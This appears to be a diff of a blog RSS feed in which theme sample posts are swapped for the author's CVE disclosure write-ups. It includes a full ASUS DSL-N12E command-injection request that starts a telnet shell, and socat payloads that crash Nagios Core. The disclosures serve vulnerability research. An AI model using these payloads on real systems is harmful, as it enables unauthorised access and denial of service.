+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So back to the assemble_line, there is a check if the opcode is EQU and surprisingly the nasm_error did not handle the error safely (marked as ERR_NONFATAL).
+The output_ins.label is then being passed into 3 functions before it gets dereferenced (define_label -&amp;gt; find_label -&amp;gt; islocal).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static bool islocal(const char *l)
+{
+    if (tasm_compatible_mode) {
+        if (l[0] == '@' &amp;amp;&amp;amp; l[1] == '@')
+            return true;
+    }
+    return (l[0] == '.' &amp;amp;&amp;amp; l[1] != '.');  &amp;lt;-- boom
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
-        <link>https://heiswayi.github.io/thinkspace/2018/03cc8d5deeb63e30f5a5d945abf99b00/</link>
-        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2018/03cc8d5deeb63e30f5a5d945abf99b00/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</guid>
         
         
       </item>
     
       <item>
-        <title>How to Download or Use This Theme</title>
-        <description>&lt;h3 id=&quot;use-this-theme-as-you-main-site&quot;&gt;Use this theme as you main site&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Download or fork the master branch of this theme repo into your GitHub account.&lt;/li&gt;
-  &lt;li&gt;Rename the repo into something like &lt;code class=&quot;highlighter-rouge&quot;&gt;your_username.github.io&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;Edit &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt; file to your preferences.&lt;/li&gt;
-  &lt;li&gt;Edit &lt;code class=&quot;highlighter-rouge&quot;&gt;about.md&lt;/code&gt; file for your About page.&lt;/li&gt;
-  &lt;li&gt;Inside &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; folder, there are sample of blog entries. Learn from it and start yours.&lt;/li&gt;
-  &lt;li&gt;Now, visit &lt;code class=&quot;highlighter-rouge&quot;&gt;http://your_username.github.io&lt;/code&gt; and you should see your blog running.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;use-this-theme-as-a-project-page&quot;&gt;Use this theme as a project page&lt;/h3&gt;
-
-&lt;p&gt;If you want to use this theme as a project page blog, you don’t need to rename the theme repo into &lt;code class=&quot;highlighter-rouge&quot;&gt;your_username.github.io&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;All you need to do, open &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt; file, change &lt;code class=&quot;highlighter-rouge&quot;&gt;baseurl&lt;/code&gt; to your project name which contains this theme, e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;baseurl: &quot;/myproject&quot;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h4 id=&quot;cheers&quot;&gt;Cheers!&lt;/h4&gt;
-</description>
-        <pubDate>Fri, 10 Jun 2016 00:00:00 +0800</pubDate>
-        <link>https://heiswayi.github.io/thinkspace/2016/how-to-download-or-use-this-theme/</link>
-        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2016/how-to-download-or-use-this-theme/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>If you have a Guest post..</title>
-        <description>&lt;p&gt;If you think that you’re going to have a guest post… take a look on this post sample. Just add &lt;code class=&quot;highlighter-rouge&quot;&gt;author: GuestName&lt;/code&gt; to the YAML front matter. Then, the &lt;strong&gt;GuestName&lt;/strong&gt; will be appear on the next of post date. Oh, the guest name will be automatically uppercase.&lt;/p&gt;
-</description>
-        <pubDate>Thu, 09 Jun 2016 00:00:00 +0800</pubDate>
-        <link>https://heiswayi.github.io/thinkspace/2016/if-you-have-a-guest-post/</link>
-        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2016/if-you-have-a-guest-post/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Markdown Cheatsheet Demo</title>
-        <description>&lt;h2 id=&quot;typography-elements-in-one&quot;&gt;Typography Elements in One&lt;/h2&gt;
-
-&lt;p&gt;Let’s start with a informative paragraph. &lt;strong&gt;This text is bolded.&lt;/strong&gt; But not this one! &lt;em&gt;How about italic text?&lt;/em&gt; Cool right? Ok, let’s &lt;strong&gt;&lt;em&gt;combine&lt;/em&gt;&lt;/strong&gt; them together. Yeah, that’s right! I have code to highlight, so &lt;code class=&quot;highlighter-rouge&quot;&gt;ThisIsMyCode()&lt;/code&gt;. What a nice! Good people will hyperlink away, so &lt;a href=&quot;#&quot;&gt;here we go&lt;/a&gt; or &lt;a href=&quot;http://www.example.com&quot;&gt;http://www.example.com&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;headings-h1-to-h6&quot;&gt;Headings H1 to H6&lt;/h2&gt;
-
-&lt;h1 id=&quot;h1-heading&quot;&gt;H1 Heading&lt;/h1&gt;
-
-&lt;h2 id=&quot;h2-heading&quot;&gt;H2 Heading&lt;/h2&gt;
-
-&lt;h3 id=&quot;h3-heading&quot;&gt;H3 Heading&lt;/h3&gt;
-
-&lt;h4 id=&quot;h4-heading&quot;&gt;H4 Heading&lt;/h4&gt;
-
-&lt;h5 id=&quot;h5-heading&quot;&gt;H5 Heading&lt;/h5&gt;
-
-&lt;h6 id=&quot;h6-heading&quot;&gt;H6 Heading&lt;/h6&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;footnote&quot;&gt;Footnote&lt;/h2&gt;
-
-&lt;p&gt;Let’s say you have text that you want to refer with a footnote, you can do that too! This is an example for the footnote number one [&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;]. You can even add more footnotes, with link! [&lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;]&lt;/p&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;blockquote&quot;&gt;Blockquote&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Start by doing what’s necessary; then do what’s possible; and suddenly you are doing the impossible. –Francis of Assisi&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; This theme does NOT support nested blockquotes.&lt;/p&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;list-items&quot;&gt;List Items&lt;/h2&gt;
-
+        <title>Cve 2018 15887</title>
+        <description>&lt;p&gt;Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution&lt;br /&gt;
+Date: 2018-08-02&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.asus.com/&lt;br /&gt;
+Software Link: https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/&lt;br /&gt;
+Version: 1.1.2.3_345&lt;br /&gt;
+Tested on: 1.1.2.3_345&lt;br /&gt;
+&lt;br /&gt;
+GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&amp;amp;next_page=Main_Analysis_Content.asp&amp;amp;next_host=www.target.com&amp;amp;group_id=&amp;amp;modified=0&amp;amp;action_mode=+Refresh+&amp;amp;action_script=&amp;amp;action_wait=&amp;amp;first_time=&amp;amp;applyFlag=1&amp;amp;preferred_lang=EN&amp;amp;firmver=1.1.2.3_345-g987b580&amp;amp;cmdMethod=ping&amp;amp;destIP=%60utelnetd+-p+1337%60&amp;amp;pingCNT=5 HTTP/1.1&lt;br /&gt;
+Host: www.target.com&lt;br /&gt;
+Connection: keep-alive&lt;br /&gt;
+Pragma: no-cache&lt;br /&gt;
+Cache-Control: no-cache&lt;br /&gt;
+Upgrade-Insecure-Requests: 1&lt;br /&gt;
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&lt;br /&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,&lt;em&gt;/&lt;/em&gt;;q=0.8&lt;br /&gt;
+Referer: http://www.target.com/Main_Analysis_Content.asp&lt;br /&gt;
+Accept-Encoding: gzip, deflate&lt;br /&gt;
+Accept-Language: en-US,en;q=0.9&lt;br /&gt;
+&lt;br /&gt;
+To connect&lt;br /&gt;&lt;/p&gt;
 &lt;ol&gt;
-  &lt;li&gt;First order list item&lt;/li&gt;
-  &lt;li&gt;Second item&lt;/li&gt;
+  &lt;li&gt;telnet www.target.com 1337&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
 &lt;/ol&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Unordered list can use asterisks&lt;/li&gt;
-  &lt;li&gt;Or minuses&lt;/li&gt;
-  &lt;li&gt;Or pluses&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;code-blocks&quot;&gt;Code Blocks&lt;/h2&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;modularpattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;// your module code goes here&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;nx&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;   
-&lt;span class=&quot;p&quot;&gt;}());&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modularpattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// alerts: 1&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modularpattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// alerts: 2&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modularpattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// alerts: 0&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Python syntax highlighting&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;No language indicated, so no syntax highlighting.
-But let's throw in a &amp;lt;b&amp;gt;tag&amp;lt;/b&amp;gt;.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;table&quot;&gt;Table&lt;/h2&gt;
-
-&lt;h3 id=&quot;table-1-with-alignment&quot;&gt;Table 1: With Alignment&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Tables&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Are&lt;/th&gt;
-      &lt;th style=&quot;text-align: right&quot;&gt;Cool&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;col 3 is&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;right-aligned&lt;/td&gt;
-      &lt;td style=&quot;text-align: right&quot;&gt;$1600&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;col 2 is&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;centered&lt;/td&gt;
-      &lt;td style=&quot;text-align: right&quot;&gt;$12&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;zebra stripes&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;are neat&lt;/td&gt;
-      &lt;td style=&quot;text-align: right&quot;&gt;$1&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h3 id=&quot;table-2-with-typography-elements&quot;&gt;Table 2: With Typography Elements&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Markdown&lt;/th&gt;
-      &lt;th&gt;Less&lt;/th&gt;
-      &lt;th&gt;Pretty&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;em&gt;Still&lt;/em&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;renders&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;nicely&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;1&lt;/td&gt;
-      &lt;td&gt;2&lt;/td&gt;
-      &lt;td&gt;3&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;horizontal-line&quot;&gt;Horizontal Line&lt;/h2&gt;
-
-&lt;p&gt;The HTML &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;hr&amp;gt;&lt;/code&gt; element is for creating a “thematic break” between paragraph-level elements. In markdown, you can create a &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;hr&amp;gt;&lt;/code&gt; with any of the following:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;___&lt;/code&gt;: three consecutive underscores&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;---&lt;/code&gt;: three consecutive dashes&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;***&lt;/code&gt;: three consecutive asterisks&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;renders to:&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;hr /&gt;
-
-&lt;hr /&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;media&quot;&gt;Media&lt;/h2&gt;
-
-&lt;h3 id=&quot;youtube-embedded-iframe&quot;&gt;YouTube Embedded Iframe&lt;/h3&gt;
-
-&lt;div class=&quot;video-container&quot;&gt;&lt;iframe src=&quot;https://www.youtube.com/embed/n1a7o44WxNo&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;image&quot;&gt;Image&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://octodex.github.com/images/minion.png&quot; alt=&quot;Minion&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;Footnote:&lt;/p&gt;
-
-&lt;div class=&quot;footnotes&quot;&gt;
-  &lt;ol&gt;
-    &lt;li id=&quot;fn:1&quot;&gt;
-      &lt;p&gt;1: Footnote number one yeah baby! &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-    &lt;/li&gt;
-    &lt;li id=&quot;fn:2&quot;&gt;
-      &lt;p&gt;2: A footnote you can link to - &lt;a href=&quot;#&quot;&gt;click here!&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-    &lt;/li&gt;
-  &lt;/ol&gt;
-&lt;/div&gt;
 </description>
-        <pubDate>Wed, 30 Dec 2015 00:00:00 +0800</pubDate>
-        <link>https://heiswayi.github.io/thinkspace/2015/markdown-cheatsheet-demo/</link>
-        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2015/markdown-cheatsheet-demo/</guid>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</guid>
         
         
       </item>
     
       <item>
-        <title>The quick, brown fox jumps over a lazy dog</title>
-        <description>&lt;p&gt;The quick, brown fox jumps over a lazy dog. DJs flock by when MTV ax quiz prog. Junk MTV quiz graced by fox whelps. Bawds jog, flick quartz, vex nymphs. Waltz, bad nymph, for quick jigs vex! Fox nymphs grab quick-jived waltz.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Brick quiz whangs jumpy veldt fox. Bright vixens jump; dozy fowl quack. Quick wafting zephyrs vex bold Jim. Quick zephyrs blow, vexing daft Jim. Sex-charged fop blew my junk TV quiz. How quickly daft jumping zebras vex.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Two driven jocks help fax my big quiz. Quick, Baz, get my woven flax jodhpurs! “Now fax quiz Jack! “ my brave ghost pled. Five quacking zephyrs jolt my wax bed. Flummoxed by job, kvetching W. zaps Iraq. Cozy sphinx waves quart jug of bad milk.&lt;/p&gt;
-
-&lt;p&gt;A very bad quack might jinx zippy fowls. Few quips galvanized the mock jury box. Quick brown dogs jump over the lazy fox. The jay, pig, fox, zebra, and my wolves quack! Blowzy red vixens fight for a quick jump.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Joaquin Phoenix was gazed by MTV for luck. A wizard’s job is to vex chumps quickly in fog. Watch “Jeopardy! “, Alex Trebek’s fun TV quiz game. Woven silk pyjamas exchanged for blue quartz. Brawny gods just flocked up to quiz and vex him.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Adjusting quiver and bow, Zompyc[1] killed the fox. My faxed joke won a pager in the cable TV quiz show. Amazingly few discotheques provide jukeboxes. My girl wove six dozen plaid jackets before she quit. Six big devils from Japan quickly forgot how to waltz.&lt;/p&gt;
-
-&lt;p&gt;Big July earthquakes confound zany experimental vow. Foxy parsons quiz and cajole the lovably dim wiki-girl. Have a pick: twenty six letters - no forcing a jumbled quiz! Crazy Fredericka bought many very exquisite opal jewels.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Sixty zippers were quickly picked from the woven jute bag. A quick movement of the enemy will jeopardize six gunboats. All questions asked by five watch experts amazed the judge. Jack quietly moved up front and seized the big ball of wax.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;The quick, brown fox jumps over a lazy dog. DJs flock by when MTV ax quiz prog. Junk MTV quiz graced by fox whelps. Bawds jog, flick quartz, vex nymphs. Waltz, bad nymph, for quick jigs vex! Fox nymphs grab quick-jived waltz. Brick quiz whangs jumpy veldt fox.&lt;/p&gt;
-
-&lt;p&gt;Bright vixens jump; dozy fowl quack. Quick wafting zephyrs vex bold Jim. Quick zephyrs blow, vexing daft Jim. Sex-charged fop blew my junk TV quiz. How quickly daft jumping zebras vex. Two driven jocks help fax my big quiz. Quick, Baz, get my woven flax jodhpurs!&lt;/p&gt;
-
-&lt;p&gt;“Now fax quiz Jack! “ my brave ghost pled. Five quacking zephyrs jolt my wax bed. Flummoxed by job, kvetching W. zaps Iraq. Cozy sphinx waves quart jug of bad milk. A very bad quack might jinx zippy fowls. Few quips galvanized the mock jury box. Quick brown dogs jump over the lazy fox. The jay, pig, fox, zebra, and my wolves quack! Blowzy red vixens fight for a quick jump. Joaquin Phoenix was gazed by MTV&lt;/p&gt;
+        <title>Cve 2018 13458</title>
+        <description>&lt;p&gt;Exploit Title: Nagios Core qh_core Denial of Service&lt;br /&gt;
+Date: 2018-07-09&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
+Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
+Version: 4.4.1 and earlier&lt;br /&gt;
+Tested on: 4.4.1&lt;br /&gt;
+CVE : CVE-2018-13458&lt;br /&gt;
+&lt;br /&gt;
+qh_core in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;br /&gt;
+&lt;br /&gt;
+$ echo -ne “#core\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
+$ echo -ne “@core\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
+&lt;br /&gt;
+#0 0x5546bc in qh_core /home/user/nagioscore/base/query-handler.c:408:6&lt;br /&gt;
+#1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12&lt;br /&gt;
+#2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4&lt;br /&gt;
+#3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12&lt;br /&gt;
+#4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4&lt;br /&gt;
+#5 0x7f6887b9882f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Mon, 12 Oct 2015 00:00:00 +0800</pubDate>
-        <link>https://heiswayi.github.io/thinkspace/2015/the-quick-brown-fox-jumps-over-a-lazy-dog/</link>
-        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2015/the-quick-brown-fox-jumps-over-a-lazy-dog/</guid>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</guid>
         
         
       </item>
     
       <item>
-        <title>What is Lorem Ipsum?</title>
-        <description>&lt;p&gt;Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&lt;/p&gt;
-
-&lt;h3 id=&quot;where-does-it-come-from&quot;&gt;Where does it come from?&lt;/h3&gt;
-
-&lt;p&gt;Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of “de Finibus Bonorum et Malorum” (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, “Lorem ipsum dolor sit amet..”, comes from a line in section 1.10.32.&lt;/p&gt;
-
-&lt;p&gt;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from “de Finibus Bonorum et Malorum” by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&lt;/p&gt;
-
-&lt;h3 id=&quot;why-do-we-use-it&quot;&gt;Why do we use it?&lt;/h3&gt;
-
-&lt;p&gt;It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using ‘Content here, content here’, making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for ‘lorem ipsum’ will uncover many web sites still in their infancy. Various versions have evolved over the years, sometimes by accident, sometimes on purpose (injected humour and the like).&lt;/p&gt;
-
-&lt;h3 id=&quot;where-can-i-get-some&quot;&gt;Where can I get some?&lt;/h3&gt;
-
-&lt;p&gt;There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don’t look even slightly believable. If you are going to use a passage of Lorem Ipsum, you need to be sure there isn’t anything embarrassing hidden in the middle of text. All the Lorem Ipsum generators on the Internet tend to repeat predefined chunks as necessary, making this the first true generator on the Internet. It uses a dictionary of over 200 Latin words, combined with a handful of model sentence structures, to generate Lorem Ipsum which looks reasonable. The generated Lorem Ipsum is therefore always free from repetition, injected humour, or non-characteristic words etc.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;This content was copied from http://www.lipsum.com/ as an example of post article.&lt;/p&gt;
-&lt;/blockquote&gt;
+        <title>Cve 2018 13457</title>
+        <description>&lt;p&gt;Exploit Title: Nagios Core qh_echo Denial of Service&lt;br /&gt;
+Date: 2018-07-09&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
+Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
+Version: 4.4.1 and earlier&lt;br /&gt;
+Tested on: 4.4.1&lt;br /&gt;
